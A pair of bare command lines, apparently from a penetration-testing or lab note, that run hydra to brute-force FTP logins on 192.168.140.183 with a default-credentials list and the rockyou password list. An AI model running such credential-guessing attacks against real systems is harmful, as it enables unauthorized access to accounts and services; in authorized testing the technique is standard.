```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.140.183 -V
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr ftp://192.168.140.183
```